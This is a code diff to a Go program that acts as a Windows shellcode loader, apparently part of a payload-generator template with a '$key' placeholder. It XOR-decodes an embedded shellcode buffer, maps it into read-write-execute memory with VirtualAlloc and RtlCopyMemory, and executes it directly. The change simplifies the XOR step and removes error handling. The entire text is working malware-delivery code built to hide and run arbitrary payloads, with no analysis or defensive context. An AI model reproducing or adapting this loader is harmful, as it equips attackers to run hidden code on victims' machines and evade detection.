@@ -1,7 +1,6 @@
 package main
 
 import (
-	"os"
 	"syscall"
 	"unsafe"
 )
@@ -24,32 +23,15 @@ var (
 
 func xor(buf []byte, key string) []byte {
 	for i := 0; i < len(buf); i++ {
-		if i%2 == 0 {
-			buf[i] ^= key[i%len(key)]
-		} else {
-			buf[i] ^= key[(i+1)%len(key)]
-		}
+		buf[i] ^= key[i%len(key)]
 	}
 	return buf
 }
 
-func checkErr(err error) {
-	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			println(err.Error())
-			os.Exit(1)
-		}
-	}
-}
 
 func main() {
 	shellcode := xor(shellcode_buf, "$key")
-
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	if addr == 0 {
-		checkErr(err)
-	}
-	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	checkErr(err)
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
